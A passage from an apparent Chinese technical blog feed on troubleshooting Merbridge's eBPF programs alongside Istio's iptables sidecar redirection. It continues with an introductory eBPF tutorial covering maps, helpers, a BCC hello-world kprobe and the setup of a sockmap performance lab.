/sys/fs/bpf/connect \</span><br><span class="line">        map name cookie_original_dst pinned /sys/fs/bpf/cookie_original_dst \</span><br><span class="line">        map name local_pod_ips pinned /sys/fs/bpf/local_pod_ips \</span><br><span class="line">        map name process_ip pinned /sys/fs/bpf/process_ip</span><br><span class="line">sudo bpftool cgroup attach /sys/fs/cgroup /sys/fs/cgroup/unified connect4 pinned /sys/fs/bpf/connect</span><br><span class="line">Error: invalid attach type</span><br><span class="line">make[1]: *** [Makefile:90: load-connect] Error 255</span><br><span class="line">make[1]: Leaving directory '/app/bpf'</span><br><span class="line">make[1]: Entering directory '/app/bpf'</span><br><span class="line">[ -f /sys/fs/bpf/cookie_original_dst ] || sudo bpftool map create /sys/fs/bpf/cookie_original_dst type lru_hash key 4 value 12 entries 65535 name cookie_original_dst</span><br><span class="line">[ -f /sys/fs/bpf/local_pod_ips ] || sudo bpftool map create /sys/fs/bpf/local_pod_ips type hash key 4 value 4 entries 1024 name local_pod_ips</span><br><span class="line">[ -f /sys/fs/bpf/process_ip ] || sudo bpftool map create /sys/fs/bpf/process_ip type lru_hash key 4 value 4 entries 1024 name process_ip</span><br><span class="line">sudo bpftool prog load mb_connect.o /sys/fs/bpf/connect \</span><br><span class="line">        map name cookie_original_dst pinned /sys/fs/bpf/cookie_original_dst \</span><br><span class="line">        map name local_pod_ips pinned /sys/fs/bpf/local_pod_ips \</span><br><span class="line">        map name process_ip pinned /sys/fs/bpf/process_ip</span><br><span class="line">Error: failed to pin program cgroup/connect4</span><br><span class="line">make[1]: *** [Makefile:89: load-connect] Error 255</span><br><span class="line">make[1]: Leaving directory '/app/bpf'</span><br><span class="line">make: *** [Makefile:3: load] Error 2</span><br><span class="line">panic: unexpected exit code: 2, err: exit status 2</span><br><span class="line">goroutine 1 [running]:</span><br><span class="line">main.main()</span><br><span class="line">        /app/cmd/mbctl/main.go:68 +0x725</span><br></pre></td></tr></table></figure><p>最后发现，cgroup v2 是单一层级树，因此只有一个挂载点即<code>/sys/fs/cgroup/unified</code></p><p><a href="https://github.com/merbridge/merbridge/issues/60" target="_blank" rel="noopener">https://github.com/merbridge/merbridge/issues/60</a></p><h4 id="iptables注入解析"><a href="#iptables注入解析" class="headerlink" title="iptables注入解析"></a>iptables注入解析</h4><p>查看<code>productpage</code> pod的<code>istio-proxy</code>容器中的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# docker top `docker ps|grep "istio-proxy_productpage"|cut -d " " -f1`</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">1337                9391                9369                0                   Feb16               ?                   00:03:14            /usr/local/bin/pilot-agent proxy sidecar --domain default.svc.cluster.local --proxyLogLevel=warning --proxyComponentLogLevel=misc:error --log_output_level=default:info --concurrency 2</span><br><span class="line">1337                10017               9391                0                   Feb16               ?                   00:18:42            /usr/local/bin/envoy -c etc/istio/proxy/envoy-rev0.json --restart-epoch 0 --drain-time-s 45 --drain-strategy immediate --parent-shutdown-time-s 60 --local-address-ip-version v4 --bootstrap-version 3 --file-flush-interval-msec 1000 --disable-hot-restart --log-format %Y-%m-%dT%T.%fZ?%l?envoy %n?%v -l warning --component-log-level misc:error --concurrency 2</span><br></pre></td></tr></table></figure><p>nsenter进入sidecar容器的命名空间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# nsenter -n --target 9391</span><br></pre></td></tr></table></figure><p>在该进程的命名空间下查看其 iptables 规则链</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看NAT表中规则配置的详细信息</span></span><br><span class="line">root@ubuntu:~# iptables -t nat -L -v</span><br><span class="line"><span class="meta">#</span><span class="bash">PREROUTING链：用于目标地址转换，将所有入站TCP流量跳转到ISTIO_INBOUND链上</span></span><br><span class="line">Chain PREROUTING (policy ACCEPT 215K packets, 13M bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 216K   13M ISTIO_INBOUND  tcp  --  any    any     anywhere             anywhere</span><br><span class="line"><span class="meta">#</span><span class="bash">INPUT链：处理输入数据包，非TCP流量将继续走OUTPUT链</span></span><br><span class="line">Chain INPUT (policy ACCEPT 216K packets, 13M bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"><span class="meta">#</span><span class="bash">OUTPUT链：将所有出站数据包跳转到ISTIO_OUTPUT链上</span></span><br><span class="line">Chain OUTPUT (policy ACCEPT 25827 packets, 2191K bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 7274  436K ISTIO_OUTPUT  tcp  --  any    any     anywhere             anywhere</span><br><span class="line"><span class="meta">#</span><span class="bash">POSTROUTING链：所有数据包流出网卡时都要先进入POSTROUTING链，内核根据数据包目的地判断是否转发</span></span><br><span class="line">Chain POSTROUTING (policy ACCEPT 29847 packets, 2432K bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"><span class="meta">#</span><span class="bash">ISTIO_INBOUND链：将所有入站流量重定向到ISTIO_IN_REDIRECT链上</span></span><br><span class="line">Chain ISTIO_INBOUND (1 references)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line">    0     0 RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:15008</span><br><span class="line">    0     0 RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh</span><br><span class="line">    0     0 RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:15090</span><br><span class="line"> 215K   13M RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:15021</span><br><span class="line">    0     0 RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:15020</span><br><span class="line"> 1256 75360 ISTIO_IN_REDIRECT  tcp  --  any    any     anywhere             anywhere</span><br><span class="line"><span class="meta">#</span><span class="bash">ISTIO_IN_REDIRECT链：将所有的入站流量跳转到本地的15006端口，至此成功的拦截了流量到sidecar中</span></span><br><span class="line">Chain ISTIO_IN_REDIRECT (3 references)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 1256 75360 REDIRECT   tcp  --  any    any     anywhere             anywhere             redir ports 15006</span><br><span class="line"><span class="meta">#</span><span class="bash">ISTIO_OUTPUT链：选择需要重定向到Envoy（即本地） 的出站流量</span></span><br><span class="line">Chain ISTIO_OUTPUT (1 references)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 2479  149K RETURN     all  --  any    lo      127.0.0.6            anywhere</span><br><span class="line">    0     0 ISTIO_IN_REDIRECT  all  --  any    lo      anywhere            !localhost            owner UID match 1337</span><br><span class="line">    0     0 RETURN     all  --  any    lo      anywhere             anywhere             ! owner UID match 1337</span><br><span class="line">  775 46500 RETURN     all  --  any    any     anywhere             anywhere             owner UID match 1337</span><br><span class="line">    0     0 ISTIO_IN_REDIRECT  all  --  any    lo      anywhere            !localhost            owner GID match 1337</span><br><span class="line">    0     0 RETURN     all  --  any    lo      anywhere             anywhere             ! owner GID match 1337</span><br><span class="line">    0     0 RETURN     all  --  any    any     anywhere             anywhere             owner GID match 1337</span><br><span class="line">    0     0 RETURN     all  --  any    any     anywhere             localhost</span><br><span class="line"> 4020  241K ISTIO_REDIRECT  all  --  any    any     anywhere             anywhere</span><br><span class="line"><span class="meta">#</span><span class="bash">ISTIO_REDIRECT链：将所有流量重定向到Sidecar（即本地）的15001端口</span></span><br><span class="line">Chain ISTIO_REDIRECT (1 references)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 4020  241K REDIRECT   tcp  --  any    any     anywhere             anywhere             redir ports 15001</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://istio.io/latest/zh/docs/" target="_blank" rel="noopener">https://istio.io/latest/zh/docs/</a></li><li><a href="https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md" target="_blank" rel="noopener">https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md</a></li><li><a href="https://arthurchiao.art/blog/cgroupv2-zh/" target="_blank" rel="noopener">https://arthurchiao.art/blog/cgroupv2-zh/</a></li><li><a href="https://arthurchiao.art/blog/bpf-advanced-notes-1-zh/" target="_blank" rel="noopener">https://arthurchiao.art/blog/bpf-advanced-notes-1-zh/</a></li><li><a href="https://www.zsythink.net/archives/1199" target="_blank" rel="noopener">https://www.zsythink.net/archives/1199</a></li><li><a href="https://github.com/istio/istio/tree/master/samples" target="_blank" rel="noopener">https://github.com/istio/istio/tree/master/samples</a></li><li><a href="https://jimmysong.io/blog/envoy-sidecar-injection-in-istio-service-mesh-deep-dive/" target="_blank" rel="noopener">https://jimmysong.io/blog/envoy-sidecar-injection-in-istio-service-mesh-deep-dive/</a></li><li><a href="https://buaq.net/go-78524.html" target="_blank" rel="noopener">https://buaq.net/go-78524.html</a></li><li><a href="https://kubernetes.io/zh/docs/reference/access-authn-authz/rbac/" target="_blank" rel="noopener">https://kubernetes.io/zh/docs/reference/access-authn-authz/rbac/</a></li><li><a href="https://manpages.ubuntu.com/manpages/focal/man7/bpf-helpers.7.html" target="_blank" rel="noopener">https://manpages.ubuntu.com/manpages/focal/man7/bpf-helpers.7.html</a></li><li><a href="https://github.com/torvalds/linux/blob/master/tools/testing/selftests/bpf/progs/sockopt_sk.c" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/tools/testing/selftests/bpf/progs/sockopt_sk.c</a></li><li><a href="https://github.com/torvalds/linux/blob/cfb92440ee71adcc2105b0890bb01ac3cddb8507/include/uapi/linux/netfilter_ipv4.h#L52" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/cfb92440ee71adcc2105b0890bb01ac3cddb8507/include/uapi/linux/netfilter_ipv4.h#L52</a></li><li><a href="https://www.cnblogs.com/tencent-cloud-native/p/15696518.html" target="_blank" rel="noopener">https://www.cnblogs.com/tencent-cloud-native/p/15696518.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h4&gt;&lt;h5 id=&quot;Docker安装&quot;&gt;&lt;a href=&quot;#Docker安装&quot; class=&quot;headerlink&quot; title=&quot;D
      
    
    </summary>
    
    
      <category term="Cloud Security" scheme="elssm.github.io/tags/Cloud-Security/"/>
    
  </entry>
  
  <entry>
    <title>浅入浅出eBPF</title>
    <link href="elssm.github.io/2022/01/21/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BAeBPF/"/>
    <id>elssm.github.io/2022/01/21/浅入浅出eBPF/</id>
    <published>2022-01-21T01:19:21.000Z</published>
    <updated>2022-01-27T08:46:03.508Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近因为一些原因开始学习eBPF，后续也将持续学习eBPF的一些具体应用。</p><h4 id="BPF发展史"><a href="#BPF发展史" class="headerlink" title="BPF发展史"></a>BPF发展史</h4><p><img src="/2022/01/21/浅入浅出eBPF/3.jpeg" alt="3"></p><h4 id="BPF介绍"><a href="#BPF介绍" class="headerlink" title="BPF介绍"></a>BPF介绍</h4><p>BPF(伯克利包过滤器)，也称为cBPF，在1992年提出，目的是为了提供一种过滤包的方法，并且要避免从内核空间到用户空间的无用的数据包复制行为。最初，BPF是在BSD内核实现的， 后来，由于其出色的设计思想，其他操作系统也将其引入, 包括Linux。</p><p>BPF架构如下图所示，从图中可以看到，BPF是作为内核报文传输路径的一个旁路存在，当报文到达内核驱动程序后，内核在将报文上送协议栈的同时，会额外将报文的副本交给BPF，之后报文会经过BPF内部逻辑的过滤。</p><p><img src="/2022/01/21/浅入浅出eBPF/1.png" alt="1"></p><h4 id="eBPF介绍"><a href="#eBPF介绍" class="headerlink" title="eBPF介绍"></a>eBPF介绍</h4><p>eBPF是扩展的BPF，2014 年初，Alexei Starovoitov 实现了 eBPF（extended Berkeley Packet Filter）。经过重新设计，eBPF 演进为一个通用执行引擎，可基于此开发性能分析工具、软件定义网络等诸多场景。eBPF 最早出现在 3.18 内核中，此后原来的 BPF 就被称为经典 BPF，缩写 cBPF（classic BPF），cBPF 现在已经基本废弃。现在，Linux 内核只运行 eBPF，内核会将加载的 cBPF 字节码透明地转换成 eBPF 再执行。</p><p>从eBPF官网摘录下段文字说明</p><p>eBPF is a revolutionary technology with origins in the Linux kernel that can run sandboxed programs in an operating system kernel. It is used to safely and efficiently extend the capabilities of the kernel without requiring to change kernel source code or load kernel modules.（一项革新性技术！！！有苹果发布会内味。起源于Linux内核，可以在操作系统内核中运行沙箱程序，被用来安全的扩展内核功能，不用去更改内核源码或加载内核模块）</p><p>Historically, the operating system has always been an ideal place to implement observability, security, and networking functionality due to the kernel’s privileged ability to oversee and control the entire system. At the same time, an operating system kernel is hard to evolve due to its central role and high requirement towards stability and security. The rate of innovation at the operating system level has thus traditionally been lower compared to functionality implemented outside of the operating system.（操作系统一直是实现可观测性、安全性和网络功能的最佳场所，因为内核具有监视和控制整个系统的权限。同时，由于其核心作用和对于稳定性和安全性的高要求，使得它很难进化。因此，和在操作系统之外实现的功能相比，操作系统级别的创新率就会偏低）</p><p>eBPF changes this formula fundamentally. By allowing to run sandboxed programs within the operating system, application developers can run eBPF programs to add additional capabilities to the operating system at runtime. The operating system then guarantees safety and execution efficiency as if natively compiled with the aid of a Just-In-Time (JIT) compiler and verification engine. This has led to a wave of eBPF-based projects covering a wide array of use cases, including next-generation networking, observability, and security functionality.（eBPF从根本上改变了这个功能，通过允许在操作系统内运行沙箱程序，应用开发者可以通过运行eBPF程序在操作系统运行时添加额外功能。操作系统会保证安全性和执行效率，就像在JIT编译器和验证器的帮助下进行本机编译一样。接着就出现了一系列基于eBPF的项目，例如下一代网络、可观察性和安全功能等）</p><p>Today, eBPF is used extensively to drive a wide variety of use cases: Providing high-performance networking and load-balancing in modern data centers and cloud native environments, extracting fine-grained security observability data at low overhead, helping application developers trace applications, providing insights for performance troubleshooting, preventive application and container runtime security enforcement, and much more. The possibilities are endless, and the innovation that eBPF is unlocked has only just begun.（今天，eBPF被用于驱动各种各样的用例，例如在数据中心和云本机环境提供高性能网络和负载均衡、以较低的开销提取细粒度安全可观测性数据、帮助应用程序开发人员跟踪应用程序、为性能故障排除提供一些方法，预防应用程序和容器运行时的安全实施等等，eBPF有无限可能，eBPF才刚刚开始）</p><h4 id="eBPF对比cBPF"><a href="#eBPF对比cBPF" class="headerlink" title="eBPF对比cBPF"></a>eBPF对比cBPF</h4><p><strong>eBPF</strong>相对于<strong>cBPF</strong>的增强如下:</p><ul><li>处理器原生指令集建模，因此更接近底层处理器架构， 性能相比cBPF提升4倍</li><li>指令集从33个扩展到了114多个，依然保持了足够的简洁</li><li>寄存器从2个32位寄存器扩展到了11个 64 位的寄存器 (其中1个只读的栈指针)</li><li>引入 bpf_call 指令和寄存器传参约定，实现零(额外)开销内核函数调用</li><li>虚拟机的最大栈空间是 512 字节(cBPF 为 16 个字节)</li><li>引入了 map 结构，用于用户空间程序与内核中的 eBPF 程序数据交换</li><li>最大指令数初期为 4096，现在已经将这个限制放大到了100万条</li></ul><h4 id="eBPF工作机制"><a href="#eBPF工作机制" class="headerlink" title="eBPF工作机制"></a>eBPF工作机制</h4><p><img src="/2022/01/21/浅入浅出eBPF/2.png" alt="2"></p><p>eBPF分为用户空间和内核空间，用户空间和内核空间的交互有两种方式</p><ul><li>BPF map：用于将内核中实现的统计摘要信息（比如测量延迟、堆栈信息）等回传至用户空间</li><li>perf-event：用于将内核采集的事件实时发送至用户空间，用户空间程序实时读取分析</li></ul><p>eBPF的工作逻辑是</p><ul><li>BPF程序通过<code>LLVM/Clang</code>编译成eBPF定义的字节码<code>prog.bpf</code></li><li>通过bpf系统调用将bpf字节码指令传入内核</li><li>经过验证器检验字节码的安全性<ul><li>加载eBPF程序的进程具有所需的权限，除非启用了非特权eBPF，否则只有特权进程才能加载eBPF程序</li><li>程序不会崩溃或以其它方式损坏系统</li><li>程序始终可以运行完成</li></ul></li><li>在确认字节码安全后将其加载对应的内核模块执行，在BPF虚拟机中会判断是否开启JIT(即时编译)，如果开启了JIT，则会通过JIT解释器将程序字节码转为特定的机器码执行，如果没有开启JIT，则通过内核解释器执行</li></ul><p>eBPF观测技术相关的程序类型有<code>kprobes</code>、<code>uporbes</code>、<code>tracepoint</code>、<code>perf_event</code></p><ul><li>kprobes：实现内核中动态跟踪。kprobes可以跟踪到Linux内核中的函数入口或返回点，但是不是稳定ABI接口，可能会因为内核版本变化导致，导致跟踪失效。理论上可以跟踪到所有导出的符号<code>/proc/kallsyms</code>。</li><li>uprobes：用户级别的动态跟踪。与kprobes类似，只是跟踪的函数为用户程序中的函数。</li><li>tracepoints：内核中静态跟踪。tracepoints是内核开发人员维护的跟踪点，能够提供稳定的ABI接口，但是由于是研发人员维护，数量和场景可能受限。</li><li>perf_events：定时采样和PMC。</li></ul><h4 id="eBPF使用场景"><a href="#eBPF使用场景" class="headerlink" title="eBPF使用场景"></a>eBPF使用场景</h4><ul><li>系统性能监控/分析工具：能够实现性能监控工具、分析工具等常用的系统分析工具，比如 sysstate 工具集，里面提供了 vmstate，pidstat 等多种工具，一些常用的 top、netstat（netstat 可被 SS 替换掉），uptime、iostat 等这些工具多数都是从 /proc、/sys、/dev 中获取的会对系统产生一定的开销，不适合频繁的调用。比如在使用 top 的时候通过 cpu 排序可以看到 top cpu 占用也是挺高的，使用 eBPF 可以在开销相对小的情况下获取系统信息，定时将 eBPF 采集的数据 copy 到用户态，然后将其发送到分析监控平台。</li><li>用户程序活体分析：做用户程序活体分析，比如 openresty 中 lua 火焰图绘制，程序内存使用监控，cdn 服务异常请求分析，程序运行状态的查看，这些操作都可以在程序无感的情况下做到，可以有效提供服务质量。</li><li>防御攻击：比如 DDoS 攻击，DDoS 攻击主要是在第七层、第三层以及第四层。第七层的攻击如 http 攻击，需要应用服务这边处理。第四层攻击，如 tcp syn 可以通过 iptable 拒绝异常的 ip，当然前提是能发现以及难点是如何区分正常流量和攻击流量，简单的防攻击会导致一些误伤，另外 tcp syn 也可以通过内核参数保护应用服务。第 3 层攻击，如 icmp。对于攻击一般会通过一些特殊的途径去发现攻击，而攻击的防御则可以通过 XDP 直接在网络包未到网络栈之前就处理掉，性能非常的优秀。</li><li>流控：可以控制网络传输速率，比如 tc。</li><li>替换 iptable：在 k8s 中iptable的规则往往会相当庞大，而iptable规则越多，性能也越差，使用eBPF就可以解决</li><li>服务调优：在cdn服务中难免会出现一些指标突刺的情况，这种突刺拉高整体的指标，对于这种突刺时常会因为找不到切入点而无从下手，eBPF存在这种潜力能帮助分析解决该问题，当eBPF发现网络抖动，会主动采集当时应用的运行状态。</li></ul><h4 id="eBPF-hooks"><a href="#eBPF-hooks" class="headerlink" title="eBPF hooks"></a>eBPF hooks</h4><p>eBPF hooks即eBPF钩子，指的是在内核中哪些地方可以加载eBPF程序，在目前的Linux内核中已经有近10中钩子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kernel functions（kprobes）</span><br><span class="line">userspace functions（uprobes）</span><br><span class="line">system calls</span><br><span class="line">fentry/fexit</span><br><span class="line">Tracepoints</span><br><span class="line">network devices（tc/xdp）</span><br><span class="line">network routes</span><br><span class="line">TCP congestion algorithms</span><br><span class="line">sockets（data level）</span><br></pre></td></tr></table></figure><h4 id="eBPF-Map"><a href="#eBPF-Map" class="headerlink" title="eBPF Map"></a>eBPF Map</h4><p>在eBPF中可以利用map在eBPF程序调用之间保存状态信息，也可以利用map在用户态程序和内核之间共享数据等。内核提供了一个系统调用<code>bpf()</code>，以让用户态程序可以根据使用场景来创建合适的map。这个系统调用会返回一个关联了这个map对象的文件描述符，后续用户态程序可以用这个文件描述符来对相应的map对象进行一些操作，如查询、更新和删除，这部分的接口在<code>tools/lib/bpf/bpf.h</code>中定义了。关于这个<code>bpf()</code>系统调用以及map操作接口的详细信息，可以参考相关资料，其中<code>bpf()</code>系统调用相关的信息可以在<code>man page</code>中找到，而map操作相关的接口可以在 <code>tools/lib/bpf/bpf.h</code> 中看到具体的实现。</p><p>eBPF支持的map类型如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">BPF_MAP_TYPE_HASH：哈希表</span><br><span class="line">BPF_MAP_TYPE_ARRAY：数组映射，已针对快速查找速度进行了优化，通常用于计数器</span><br><span class="line">BPF_MAP_TYPE_PROG_ARRAY：对应eBPF程序的文件描述符数组；用于实现跳转表和子程序以处理特定的数据包协议</span><br><span class="line">BPF_MAP_TYPE_PERCPU_ARRAY：每个CPU的阵列，用于实现延迟的直方图</span><br><span class="line">BPF_MAP_TYPE_PERF_EVENT_ARRAY：存储指向struct perf_event的指针，用于读取和存储perf事件计数器</span><br><span class="line">BPF_MAP_TYPE_CGROUP_ARRAY：存储指向控制组的指针</span><br><span class="line">BPF_MAP_TYPE_PERCPU_HASH：每个CPU的哈希表</span><br><span class="line">BPF_MAP_TYPE_LRU_HASH：仅保留最近使用项目的哈希表</span><br><span class="line">BPF_MAP_TYPE_LRU_PERCPU_HASH：每个CPU的哈希表，仅保留最近使用的项目</span><br><span class="line">BPF_MAP_TYPE_LPM_TRIE：最长前缀匹配树，适用于将IP地址匹配到某个范围</span><br><span class="line">BPF_MAP_TYPE_STACK_TRACE：存储堆栈跟踪</span><br><span class="line">BPF_MAP_TYPE_ARRAY_OF_MAPS：地图中地图数据结构</span><br><span class="line">BPF_MAP_TYPE_HASH_OF_MAPS：地图中地图数据结构</span><br><span class="line">BPF_MAP_TYPE_DEVICE_MAP：用于存储和查找网络设备引用</span><br><span class="line">BPF_MAP_TYPE_SOCKET_MAP：存储和查找套接字，并允许使用BPF辅助函数进行套接字重定向</span><br></pre></td></tr></table></figure><h4 id="eBPF-Helper-Function"><a href="#eBPF-Helper-Function" class="headerlink" title="eBPF Helper Function"></a>eBPF Helper Function</h4><p>eBPF程序不能调用任意内核函数。如果允许这样做，会将eBPF程序绑定到特定的内核版本，并且会使程序的兼容性复杂化。相反，eBPF程序可以对helper函数进行函数调用，helper函数是内核提供的一种稳定的API。</p><p><img src="/2022/01/21/浅入浅出eBPF/5.png" alt="5"></p><p>一些可用于辅助调用的例子有</p><ul><li>生成随机数</li><li>获取当前时间和日期</li><li>eBPF map访问</li><li>获取进程/cgroup上下文</li><li>操作网络数据包和转发逻辑</li></ul><h4 id="BCC"><a href="#BCC" class="headerlink" title="BCC"></a>BCC</h4><h5 id="bcc介绍"><a href="#bcc介绍" class="headerlink" title="bcc介绍"></a>bcc介绍</h5><p>源码地址：<a href="https://github.com/iovisor/bcc" target="_blank" rel="noopener">https://github.com/iovisor/bcc</a></p><p>BCC工具全称BPF Compiler Collection (BCC)，是一个很强大的库，强大的内核分析工具eBPF就是基于bcc开发的，利用这个库可以从底层获取操作系统性能信息，网络性能信息等许多与内核交互的信息。bcc使得bpf程序更容易被书写，bcc使用 Python和Lua，虽然核心依旧是一部分C语言代码（BPF C代码）。但是我们很快就可以体验了，这比手动安装 C 语言依赖、编译、插入内核要方便的多。</p><h5 id="bcc-tools安装"><a href="#bcc-tools安装" class="headerlink" title="bcc-tools安装"></a>bcc-tools安装</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum -y install bcc-tools</span><br></pre></td></tr></table></figure><h5 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h5><p>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">BPF(text=<span class="string">'int kprobe__sys_clone(void *ctx)&#123;bpf_trace_printk("Hello,World!\\n"); return 0;&#125;'</span>).trace_print()</span><br></pre></td></tr></table></figure><p>执行如下</p><p><img src="/2022/01/21/浅入浅出eBPF/4.png" alt="4"></p><p>分析如下</p><ul><li><p>text定义了一个嵌入的用C语言写的BPF程序</p></li><li><p><code>kprobe__sys_clone()</code>是一个通过内核探针(kprobe)进行内核动态跟踪的快捷方式。如果一个C函数名开头为<code>kprobe__</code>，则后面部分实际为设备的内核函数名，这里是<code>sys_clone()</code></p></li><li><p><code>bpf_trace_printk()</code>用于<code>printf()</code>到<code>trace_pipe</code>。一般用来快速调试</p></li><li><p><code>return 0</code>用来关闭凭证</p></li><li><p><code>.trace_print()</code>，一个bcc实例会通过这个读取<code>trace_pipe</code>并打印</p></li></ul><h4 id="利用eBPF提升socket性能"><a href="#利用eBPF提升socket性能" class="headerlink" title="利用eBPF提升socket性能"></a>利用eBPF提升socket性能</h4><h5 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h5><p>本实验主要是利用ebpf sockmap/redirection来提升socket的性能。sockmap是 eBPF 提供的一个特殊的<code>eBPF MAP</code>类型，主要用于socket redirection，在 socket redirection中，socket被添加到sockmap中并由key（主要是四元组）引用，然后该 socket 在调用<code>bpf_sockmap_redirect()</code>时进行重定向。对于本地通信方式而言，这样可以绕过整个 TCP/IP 协议栈，直接将数据发送到 socket 对端，从而提高性能。</p><h5 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h5><p><a href="https://github.com/cyralinc/os-eBPF" target="_blank" rel="noopener">https://github.com/cyralinc/os-eBPF</a></p><h5 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h5><ul><li>Ubuntu Linux 18.04 with 5.3.0-40-generic</li></ul><h5 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h5><h6 id="安装相应包"><a href="#安装相应包" class="headerlink" title="安装相应包"></a>安装相应包</h6><ul><li>sudo apt-get install -y make gcc libssl-dev bc libelf-dev libcap-dev clang gcc-multilib llvm libncurses5-dev git pkg-config libmnl-dev bison flex graphviz</li><li>sudo apt-get install iproute2</li><li>sudo apt install libbfd-dev libcap-dev zlib1g-dev libelf-dev libssl-dev</li></ul><h6 id="修改apt源"><a href="#修改apt源" class="headerlink" title="修改apt源"></a>修改apt源</h6><p><a href="https://blog.csdn.net/weixin_44143222/article/details/88592193" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44143222/article/details/88592193</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get source linux-image-$(uname -r)</span><br><span class="line">apt-get source linux-image-unsigned-$(uname -r)</span><br></pre></td></tr></table></figure><h6 id="或直接下载对应源码"><a href="#或直接下载对应源码" class="headerlink" title="或直接下载对应源码"></a>或直接下载对应源码</h6><ul><li><a href="https://mirrors.edge.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/</a></li></ul><h6 id="编译-bpftool-工具"><a href="#编译-bpftool-工具" class="headerlink" title="编译 bpftool 工具"></a>编译 bpftool 工具</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd linux-5.3/tools/bpf/bpftool</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h6 id="编译bpf字节码"><a href="#编译bpf字节码" class="headerlink" title="编译bpf字节码"></a>编译bpf字节码</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/os-eBPF/sockredir$ clang -O2 -g -target bpf -I /usr/include/linux/ -I /usr/src/linux-headers-5.3.0-40/include/ -c bpf_sockops_v4.c  -o 